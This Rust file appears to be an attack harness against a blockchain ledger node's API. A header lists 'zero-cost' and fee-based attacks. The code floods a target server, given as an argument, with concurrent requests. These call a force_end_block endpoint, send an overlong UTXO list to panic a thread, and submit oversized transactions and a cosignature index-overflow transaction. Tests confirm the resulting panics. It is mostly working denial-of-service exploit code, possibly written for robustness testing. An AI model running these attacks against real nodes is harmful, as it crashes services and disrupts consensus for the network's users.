//!
//! xx ? xx, xx
//!
//! 1. zero-cost attacks: bugs in api
//!     1. http://<ADDR>:8668/utxo_sid_list (Vec index overflow, thread panic)
//!     2. http://<ADDR>:8669/force_end_block (destroy the consensus algorithm)
//! 2. zero-cost attacks: large-payload invalid tx, against cpu&disk
//!     1. large number of cosignature in one tx
//!     2. large number of operations in one tx
//!     3. large number of inputs in one tx (transfer only)
//!     4. large number of outputs in one tx (transfer & issue)
//!     5. size of asset memo (define asset & update memo)
//! 3. SetFee-cost attacks: bugs in ledger
//!     1. cosiguature index overflow
//!         - need to set a valid fee,
//!         - but since the worker thread will panic,
//!         - so the fee will never actually be spent
//! 4. SpentFee-cost attacks: bugs in ledger
//!

use async_std::task;
use lazy_static::lazy_static;
use ledger::data_model::{
    AssetRules, AssetTypeCode, AuthenticatedUtxo, DefineAsset, DefineAssetBody,
    IssueAsset, IssueAssetBody, IssuerKeyPair, IssuerPublicKey, Memo, Operation,
    SignatureRules, StateCommitmentData, Transaction, TransferType, TxOutput, TxnEffect,
    TxoRef, TxoSID, UpdateMemo, UpdateMemoBody, ASSET_TYPE_FRA, BLACK_HOLE_PUBKEY,
    TX_FEE_MIN,
};
use parking_lot::{Condvar, Mutex};
use rand::random;
use rand_chacha::rand_core::SeedableRng;
use rand_chacha::ChaChaRng;
use ruc::*;
use std::{env, sync::Arc};
use txn_builder::TransferOperationBuilder;
use utils::{HashOf, SignatureOf};
use zei::{
    setup::PublicParams,
    xfr::{
        asset_record::{
            build_blind_asset_record, open_blind_asset_record, AssetRecordType,
        },
        sig::{XfrKeyPair, XfrSecretKey},
        structs::{AssetRecordTemplate, OpenAssetRecord},
    },
};

lazy_static! {
    static ref COND_PAIR: Arc<(Mutex<u32>, Condvar)> =
        Arc::new((Mutex::new(0), Condvar::new()));
    static ref LIMITER: u32 = env::var("CC_LIMIT")
        .map(|l| pnk!(l.parse::<u32>()))
        .unwrap_or(256);
    static ref SERVER: String = pnk!(env::args().nth(1));
    static ref SURF_CLI: surf::Client = surf::client();
}

fn main() {
    task::block_on(async {
        loop {
            attack_submission().await;
        }
    });
}

async fn attack_submission() {
    sem_add();
    task::spawn(async {
        info_omit!(attack__spentfee_cost_ledger_bug().await);
        info_omit!(attack__setfee_cost_ledger_bug().await);
        info_omit!(attack__zero_cost_invalid_tx().await);
        attack__zero_cost_api_bug().await;
        sem_sub();
    });
}

#[allow(non_snake_case)]
async fn attack__zero_cost_api_bug() {
    let req = surf::post(format!("{}:8669/force_end_block", &*SERVER))
        .header("Content-Type", "application/json");
    let _ = SURF_CLI.send(req).await;

    let sid_list = (0..899)
        .map(|_| 9.to_string())
        .collect::<Vec<_>>()
        .join(",");
    let req = surf::get(format!("{}:8668/utxo_sid_list/\"{}\"", &*SERVER, sid_list));
    let _ = SURF_CLI.send(req).await;
}

#[allow(non_snake_case)]
async fn attack__zero_cost_invalid_tx() -> Result<()> {
    let txs = get_seq_id()
        .await
        .c(d!())
        .map(|seq_id| {
            vec![
                generate_evil_tx_big_cosignature(seq_id),
                generate_evil_tx_big_define_asset(seq_id),
                generate_evil_tx_big_input_transfer(seq_id),
                generate_evil_tx_big_memo_update_memo(seq_id),
                generate_evil_tx_big_memo_define_asset(seq_id),
                generate_evil_tx_big_output_issue(seq_id),
                generate_evil_tx_big_output_transfer(seq_id),
            ]
            .into_iter()
            .filter_map(|tx| info!(tx).ok())
            .collect()
        })
        .and_then(|txs| check_tx(txs).c(d!()))?;

    for tx in txs.into_iter() {
        let req = surf::post(format!("{}:8669/submit_transaction", &*SERVER))
            .header("Content-Type", "application/json")
            .body(surf::Body::from_json(&tx).unwrap());
        let _ = SURF_CLI.send(req).await;
    }

    Ok(())
}

#[allow(non_snake_case)]
async fn attack__setfee_cost_ledger_bug() -> Result<()> {
    let txs = get_seq_id()
        .await
        .c(d!())
        .map(|seq_id| {
            vec![generate_evil_tx_cosignature_index_overflow(seq_id)]
                .into_iter()
                .filter_map(|tx| info!(tx).ok())
                .collect()
        })
        .and_then(|txs| check_tx(txs).c(d!()))?;

    for tx in txs.into_iter() {
        let req = surf::post(format!("{}:8669/submit_transaction", &*SERVER))
            .header("Content-Type", "application/json")
            .body(surf::Body::from_json(&tx).unwrap());
        let _ = SURF_CLI.send(req).await;
    }

    Ok(())
}

#[allow(non_snake_case)]
async fn attack__spentfee_cost_ledger_bug() -> Result<()> {
    Ok(())
}

fn generate_evil_tx_big_cosignature(seq_id: u64) -> Result<Transaction> {
    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    // public key and weight
    let kw = (0..(8134 + random::<u32>() % 139))
        .map(|_| {
            (
                XfrKeyPair::generate(&mut prng).get_pk(),
                random::<u64>() % 234,
            )
        })
        .collect();

    let sig_rules = SignatureRules {
        threshold: 100 + random::<u64>() % 1000,
        weights: kw,
    };

    let code = AssetTypeCode::gen_random();
    let issuer_key = IssuerPublicKey { key: key.get_pk() };

    let mut asset_rules = AssetRules {
        transferable: true,
        updatable: true,
        decimals: random::<u8>() % 12,
        ..AssetRules::default()
    };
    asset_rules.set_transfer_multisig_rules(Some(sig_rules));

    let memo = Memo(String::from_utf8_lossy(&[random::<u8>(); 8]).into_owned());
    let asset_body =
        DefineAssetBody::new(&code, &issuer_key, asset_rules, Some(memo), None, None)
            .c(d!())?;
    let asset_create =
        DefineAsset::new(asset_body, &IssuerKeyPair { keypair: &key }).c(d!())?;
    tx.add_operation(Operation::DefineAsset(asset_create));

    Ok(tx)
}

fn generate_evil_tx_big_define_asset(seq_id: u64) -> Result<Transaction> {
    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    for _ in 0..(1073 + random::<u64>() % 19) {
        let code = AssetTypeCode::gen_random();
        let issuer_key = IssuerPublicKey { key: key.get_pk() };
        let asset_rules = AssetRules {
            transferable: true,
            updatable: true,
            decimals: random::<u8>() % 12,
            ..AssetRules::default()
        };
        let memo = Memo(String::from_utf8_lossy(&[random::<u8>(); 8]).into_owned());
        let asset_body = DefineAssetBody::new(
            &code,
            &issuer_key,
            asset_rules,
            Some(memo),
            None,
            None,
        )
        .c(d!())?;
        let asset_create =
            DefineAsset::new(asset_body, &IssuerKeyPair { keypair: &key }).c(d!())?;
        tx.add_operation(Operation::DefineAsset(asset_create));
    }

    Ok(tx)
}

fn generate_evil_tx_big_memo_update_memo(seq_id: u64) -> Result<Transaction> {
    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    let new_memo =
        Memo(String::from_utf8_lossy(&[random::<u8>(); 651 * 1024]).into_owned());
    let mut memo_update = UpdateMemo::new(
        UpdateMemoBody {
            new_memo,
            asset_type: AssetTypeCode::gen_random(),
            no_replay_token: tx.body.no_replay_token,
        },
        &key,
    );

    memo_update.pubkey = key.get_pk();

    tx.add_operation(Operation::UpdateMemo(memo_update));

    Ok(tx)
}

fn generate_evil_tx_big_memo_define_asset(seq_id: u64) -> Result<Transaction> {
    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    let code = AssetTypeCode::gen_random();

    let issuer_key = IssuerPublicKey { key: key.get_pk() };

    let asset_rules = AssetRules {
        transferable: true,
        updatable: true,
        decimals: random::<u8>() % 12,
        ..AssetRules::default()
    };

    let memo = Memo(String::from_utf8_lossy(&[random::<u8>(); 698 * 1024]).into_owned());

    let asset_body =
        DefineAssetBody::new(&code, &issuer_key, asset_rules, Some(memo), None, None)
            .c(d!())?;

    let asset_create =
        DefineAsset::new(asset_body, &IssuerKeyPair { keypair: &key }).c(d!())?;

    tx.add_operation(Operation::DefineAsset(asset_create));

    Ok(tx)
}

fn generate_evil_tx_big_input_transfer(seq_id: u64) -> Result<Transaction> {
    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let code = AssetTypeCode::gen_random();

    let input_amount = 1200 + random::<u64>() % 304;

    let template = AssetRecordTemplate::with_no_asset_tracing(
        1,
        code.val,
        AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
        key.get_pk(),
    );

    let params = PublicParams::default();
    let mut builder = TransferOperationBuilder::new();

    for _ in 0..input_amount {
        let (ba, _, _) =
            build_blind_asset_record(&mut prng, &params.pc_gens, &template, Vec::new());

        builder
            .add_input(
                TxoRef::Absolute(TxoSID(random::<u64>())),
                open_blind_asset_record(&ba, &None, &key).c(d!())?,
                None,
                None,
                1,
            )
            .c(d!())?;
    }

    builder
        .add_output(
            &AssetRecordTemplate::with_no_asset_tracing(
                input_amount,
                code.val,
                AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
                XfrKeyPair::generate(&mut prng).get_pk(),
            ),
            None,
            None,
            None,
        )
        .c(d!())?;

    let op = builder
        .balance()
        .c(d!())?
        .create(TransferType::Standard)
        .c(d!())?
        .sign(&key)
        .c(d!())?
        .transaction()
        .c(d!())?;

    tx.add_operation(op);

    Ok(tx)
}

fn generate_evil_tx_big_output_issue(seq_id: u64) -> Result<Transaction> {
    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let code = AssetTypeCode::gen_random();

    let round = 910 + random::<u64>() % 103;

    let params = PublicParams::default();

    let mut outputs = vec![];
    for _ in 0..round {
        let template = AssetRecordTemplate::with_no_asset_tracing(
            random::<u64>() % 2611,
            code.val,
            AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
            key.get_pk(),
        );
        let (ba, _, _) =
            build_blind_asset_record(&mut prng, &params.pc_gens, &template, vec![]);
        let output = (
            TxOutput {
                id: None,
                record: ba,
                lien: None,
            },
            None,
        );
        outputs.push(output);
    }

    let asset_iss_body = pnk!(IssueAssetBody::new(&code, 0, &outputs));

    let asset_iss_op = pnk!(IssueAsset::new(
        asset_iss_body,
        &IssuerKeyPair { keypair: &key }
    ));

    tx.add_operation(Operation::IssueAsset(asset_iss_op));

    Ok(tx)
}

fn generate_evil_tx_big_output_transfer(seq_id: u64) -> Result<Transaction> {
    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let code = AssetTypeCode::gen_random();

    let input_amount = 910 + random::<u64>() % 209;

    let template = AssetRecordTemplate::with_no_asset_tracing(
        input_amount,
        code.val,
        AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
        key.get_pk(),
    );

    let params = PublicParams::default();
    let mut builder = TransferOperationBuilder::new();

    let (ba, _, _) =
        build_blind_asset_record(&mut prng, &params.pc_gens, &template, Vec::new());

    builder
        .add_input(
            TxoRef::Absolute(TxoSID(random::<u64>())),
            open_blind_asset_record(&ba, &None, &key).c(d!())?,
            None,
            None,
            input_amount,
        )
        .c(d!())?;

    for _ in 0..input_amount {
        builder
            .add_output(
                &AssetRecordTemplate::with_no_asset_tracing(
                    1,
                    code.val,
                    AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
                    XfrKeyPair::generate(&mut prng).get_pk(),
                ),
                None,
                None,
                None,
            )
            .c(d!())?;
    }

    let op = builder
        .balance()
        .c(d!())?
        .create(TransferType::Standard)
        .c(d!())?
        .sign(&key)
        .c(d!())?
        .transaction()
        .c(d!())?;

    tx.add_operation(op);

    Ok(tx)
}

fn generate_evil_tx_cosignature_index_overflow(seq_id: u64) -> Result<Transaction> {
    get_cosignature_fee_op().c(d!()).and_then(|fee_op| {
        generate_evil_tx_cosignature_index_overflow_inner(fee_op, seq_id).c(d!())
    })
}

fn generate_evil_tx_cosignature_index_overflow_inner(
    fee_op: Operation,
    seq_id: u64,
) -> Result<Transaction> {
    let params = PublicParams::default();
    let mut prng = ChaChaRng::from_entropy();
    let key1 = XfrKeyPair::generate(&mut prng);
    let key2 = XfrKeyPair::generate(&mut prng);

    let mut tx = Transaction::from_operation(fee_op, seq_id);

    ///////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////

    // public key and weight
    let kw = vec![(key1.get_pk(), 1), (key2.get_pk(), 1)];

    let sig_rules = SignatureRules {
        threshold: 2,
        weights: kw,
    };

    let code = AssetTypeCode::gen_random();
    let issuer_key = IssuerPublicKey { key: key1.get_pk() };

    let mut asset_rules = AssetRules {
        transferable: true,
        updatable: true,
        ..AssetRules::default()
    };
    asset_rules.set_transfer_multisig_rules(Some(sig_rules));

    let asset_body =
        DefineAssetBody::new(&code, &issuer_key, asset_rules, None, None, None)
            .c(d!())?;
    let asset_create =
        DefineAsset::new(asset_body, &IssuerKeyPair { keypair: &key1 }).c(d!())?;
    tx.add_operation(Operation::DefineAsset(asset_create));

    let template = AssetRecordTemplate::with_no_asset_tracing(
        2611,
        code.val,
        AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
        key1.get_pk(),
    );
    let (ba, _, _) =
        build_blind_asset_record(&mut prng, &params.pc_gens, &template, vec![]);
    let ba_keep = ba.clone();
    let output = (
        TxOutput {
            id: None,
            record: ba,
            lien: None,
        },
        None,
    );
    let asset_iss_body = pnk!(IssueAssetBody::new(&code, 0, &[output]));
    let asset_iss_op = pnk!(IssueAsset::new(
        asset_iss_body,
        &IssuerKeyPair { keypair: &key1 }
    ));

    tx.add_operation(Operation::IssueAsset(asset_iss_op));

    ///////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////

    let oar = pnk!(open_blind_asset_record(&ba_keep, &None, &key1));

    let mut builder = TransferOperationBuilder::new();

    builder
        .add_input(TxoRef::Relative(0), oar, None, None, 1)
        .c(d!())?
        .add_output(
            &AssetRecordTemplate::with_no_asset_tracing(
                1,
                code.val,
                AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
                *BLACK_HOLE_PUBKEY,
            ),
            None,
            None,
            None,
        )
        .c(d!())?
        .balance()
        .c(d!())?
        .create(TransferType::Standard)
        .c(d!())?
        .sign(&key1)
        .c(d!())?;

    // index overflow
    let cosig1 = pnk!(builder.create_cosignature(&key1, 100 + random::<usize>() % 2000));
    let cosig2 = pnk!(builder.create_cosignature(&key1, 200 + random::<usize>() % 1000));
    builder
        .attach_signature(cosig1)
        .c(d!())?
        .attach_signature(cosig2)
        .c(d!())?;

    tx.add_operation(builder.transaction().c(d!())?);

    Ok(tx)
}

fn get_cosignature_fee_op() -> Result<Operation> {
    let key = env::var("COSIG_FEE_MNEMONIC")
        .c(d!())
        .and_then(|m| wallet::restore_keypair_from_mnemonic_default(&m).c(d!()))
        .or_else(|_| {
            env::var("COSIG_FEE_KEY").c(d!()).and_then(|k| {
                serde_json::from_str::<XfrSecretKey>(&format!("\"{}\"", k))
                    .map(|k| k.into_keypair())
                    .c(d!())
            })
        })?;
    let pk_b64 = wallet::public_key_to_base64(&key.get_pk());

    // Assume the test user has only FRA
    let sid = task::block_on(
        surf::get(format!("{}:8667/get_owned_utxos/{}", &*SERVER, pk_b64))
            .recv_json::<Vec<TxoSID>>(),
    )
    .map_err(|e| eg!(e))?
    .into_iter()
    .next()
    .c(d!())?;

    let brd = task::block_on(
        surf::get(format!("{}:8668/utxo_sid/{}", &*SERVER, sid.0))
            .recv_json::<AuthenticatedUtxo>(),
    )
    .map(|r| r.utxo.0.record)
    .map_err(|e| eg!(e))?;

    open_blind_asset_record(&brd, &None, &key)
        .c(d!())
        .and_then(|oar| generate_fee_operation_inner(sid, oar, &key).c(d!()))
}

fn generate_fee_operation() -> Result<Operation> {
    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let code = AssetTypeCode {
        val: ASSET_TYPE_FRA,
    };

    let template = AssetRecordTemplate::with_no_asset_tracing(
        TX_FEE_MIN,
        code.val,
        AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
        key.get_pk(),
    );

    let params = PublicParams::default();
    let (ba, _, _) =
        build_blind_asset_record(&mut prng, &params.pc_gens, &template, Vec::new());
    let oar = open_blind_asset_record(&ba, &None, &key).c(d!())?;

    generate_fee_operation_inner(TxoSID(random::<u64>()), oar, &key).c(d!())
}

fn generate_fee_operation_inner(
    sid: TxoSID,
    oar: OpenAssetRecord,
    key: &XfrKeyPair,
) -> Result<Operation> {
    let mut builder = TransferOperationBuilder::new();
    builder
        .add_input(TxoRef::Absolute(sid), oar, None, None, TX_FEE_MIN)
        .c(d!())?
        .add_output(
            &AssetRecordTemplate::with_no_asset_tracing(
                TX_FEE_MIN,
                ASSET_TYPE_FRA,
                AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
                *BLACK_HOLE_PUBKEY,
            ),
            None,
            None,
            None,
        )
        .c(d!())?
        .balance()
        .c(d!())?
        .create(TransferType::Standard)
        .c(d!())?
        .sign(key)
        .c(d!())?
        .transaction()
        .c(d!())
}

fn check_tx(txs: Vec<Transaction>) -> Result<Vec<Transaction>> {
    txs.into_iter()
        .filter(|tx| tx.check_fee() && tx.check_fra_no_illegal_issuance(100_0000))
        .map(|tx| TxnEffect::compute_effect(tx).c(d!()).map(|txe| txe.txn))
        .collect()
}

async fn get_seq_id() -> Result<u64> {
    type Resp = (
        HashOf<Option<StateCommitmentData>>,
        u64,
        SignatureOf<(HashOf<Option<StateCommitmentData>>, u64)>,
    );

    let req = surf::get(format!("{}:8668/global_state", &*SERVER));
    let res: Resp = SURF_CLI.recv_json(req).await.map_err(|e| eg!(e))?;

    Ok(res.1)
}

fn sem_add() {
    let &(ref lock, ref cvar) = COND_PAIR.as_ref();
    let mut cnt = lock.lock();
    while *LIMITER < *cnt {
        cvar.wait(&mut cnt);
    }
    *cnt += 1
}

fn sem_sub() {
    let &(ref lock, ref cvar) = COND_PAIR.as_ref();
    let mut cnt = lock.lock();
    *cnt -= 1;
    cvar.notify_one();
}

#[cfg(test)]
mod test {
    //!
    //! test fee-needed attacks
    //!

    use super::*;
    use ledger::store::{fra_gen_initial_tx, LedgerState, LedgerUpdate};

    #[test]
    #[should_panic]
    fn cosignature_index_overflow() {
        let (_, mut ledger, fee_op) = pnk!(prepare());

        let tx2 = pnk!(generate_evil_tx_cosignature_index_overflow_inner(fee_op, 0));

        let effect = pnk!(TxnEffect::compute_effect(tx2));
        let mut block = pnk!(ledger.start_block());

        // will panic because of index overflow,
        // this will only occur in `DeliverTx` of ABCI
        pnk!(ledger.apply_transaction(&mut block, effect));

        pnk!(ledger.finish_block(block));
    }

    #[test]
    #[should_panic]
    fn loop_relative_txoref() {
        let (_, mut ledger, fee_op) = pnk!(prepare());
        let tx = pnk!(generate_evil_tx_loop_relative_txoref(fee_op, 0));

        let effect = pnk!(TxnEffect::compute_effect(tx));
        let mut block = pnk!(ledger.start_block());
        pnk!(ledger.apply_transaction(&mut block, effect));
        pnk!(ledger.finish_block(block));
    }

    #[test]
    #[should_panic]
    fn max_units_overflow() {
        let (fra_owner_kp, mut ledger, _) = pnk!(prepare());
        let op = pnk!(generate_max_units_overflow_op(&fra_owner_kp));

        let tx = Transaction::from_operation(op, 0);

        let effect = pnk!(TxnEffect::compute_effect(tx));
        let mut block = pnk!(ledger.start_block());
        pnk!(ledger.apply_transaction(&mut block, effect));
        pnk!(ledger.finish_block(block));
    }

    fn generate_max_units_overflow_op(fra_kp: &XfrKeyPair) -> Result<Operation> {
        let mut prng = ChaChaRng::from_entropy();
        let params = PublicParams::default();

        let code = AssetTypeCode {
            val: ASSET_TYPE_FRA,
        };

        let template1 = AssetRecordTemplate::with_no_asset_tracing(
            u64::MAX,
            code.val,
            AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
            fra_kp.get_pk(),
        );

        let template2 = AssetRecordTemplate::with_no_asset_tracing(
            2,
            code.val,
            AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
            fra_kp.get_pk(),
        );

        let (ba1, _, _) =
            build_blind_asset_record(&mut prng, &params.pc_gens, &template1, vec![]);

        let (ba2, _, _) =
            build_blind_asset_record(&mut prng, &params.pc_gens, &template2, vec![]);

        let iss_body = IssueAssetBody::new(
            &code,
            1,
            &[
                (
                    TxOutput {
                        id: None,
                        record: ba1,
                        lien: None,
                    },
                    None,
                ),
                (
                    TxOutput {
                        id: None,
                        record: ba2,
                        lien: None,
                    },
                    None,
                ),
            ],
        )
        .c(d!())?;

        let iss_op =
            IssueAsset::new(iss_body, &IssuerKeyPair { keypair: &fra_kp }).c(d!())?;

        Ok(Operation::IssueAsset(iss_op))
    }

    fn prepare() -> Result<(XfrKeyPair, LedgerState, Operation)> {
        let mut ledger = LedgerState::test_ledger();
        let mut prng = ChaChaRng::from_entropy();
        let params = PublicParams::default();
        let fra_owner_kp = XfrKeyPair::generate(&mut prng);

        let tx = fra_gen_initial_tx(&fra_owner_kp);
        let effect = TxnEffect::compute_effect(tx).c(d!())?;
        let mut block = ledger.start_block().c(d!())?;
        let tmp_sid = ledger.apply_transaction(&mut block, effect).c(d!())?;
        let txo_sid = ledger
            .finish_block(block)
            .c(d!())?
            .remove(&tmp_sid)
            .c(d!())?
            .1[0];

        let template = AssetRecordTemplate::with_no_asset_tracing(
            21000000000000000,
            ASSET_TYPE_FRA,
            AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
            fra_owner_kp.get_pk(),
        );

        let (ba, _, _) =
            build_blind_asset_record(&mut prng, &params.pc_gens, &template, Vec::new());
        let oar = open_blind_asset_record(&ba, &None, &fra_owner_kp).c(d!())?;
        let fee_op =
            generate_fee_operation_inner(txo_sid, oar, &fra_owner_kp).c(d!())?;

        Ok((fra_owner_kp, ledger, fee_op))
    }

    // Can not pass!
    // The ledger is correct!
    fn generate_evil_tx_loop_relative_txoref(
        fee_op: Operation,
        seq_id: u64,
    ) -> Result<Transaction> {
        let mut tx = Transaction::from_operation(fee_op, seq_id);

        let mut prng = ChaChaRng::from_entropy();
        let key1 = XfrKeyPair::generate(&mut prng);
        let key2 = XfrKeyPair::generate(&mut prng);

        let amount = 11090000000000000;

        let template1 = AssetRecordTemplate::with_no_asset_tracing(
            amount,
            ASSET_TYPE_FRA,
            AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
            key1.get_pk(),
        );

        let template2 = AssetRecordTemplate::with_no_asset_tracing(
            amount,
            ASSET_TYPE_FRA,
            AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
            key2.get_pk(),
        );

        let params = PublicParams::default();
        let mut builder = TransferOperationBuilder::new();

        let (ba1, _, _) =
            build_blind_asset_record(&mut prng, &params.pc_gens, &template1, Vec::new());
        let (ba2, _, _) =
            build_blind_asset_record(&mut prng, &params.pc_gens, &template2, Vec::new());

        builder
            .add_input(
                TxoRef::Relative(0),
                open_blind_asset_record(&ba1, &None, &key1).c(d!())?,
                None,
                None,
                amount,
            )
            .c(d!())?
            .add_input(
                TxoRef::Relative(1),
                open_blind_asset_record(&ba2, &None, &key2).c(d!())?,
                None,
                None,
                amount,
            )
            .c(d!())?;

        builder
            .add_output(
                &AssetRecordTemplate::with_no_asset_tracing(
                    amount,
                    ASSET_TYPE_FRA,
                    AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
                    key2.get_pk(),
                ),
                None,
                None,
                None,
            )
            .c(d!())?
            .add_output(
                &AssetRecordTemplate::with_no_asset_tracing(
                    amount,
                    ASSET_TYPE_FRA,
                    AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
                    key1.get_pk(),
                ),
                None,
                None,
                None,
            )
            .c(d!())?;

        let op = builder
            .balance()
            .c(d!())?
            .create(TransferType::Standard)
            .c(d!())?
            .sign(&key1)
            .c(d!())?
            .sign(&key2)
            .c(d!())?
            .transaction()
            .c(d!())?;

        tx.add_operation(op);

        Ok(tx)
    }
}
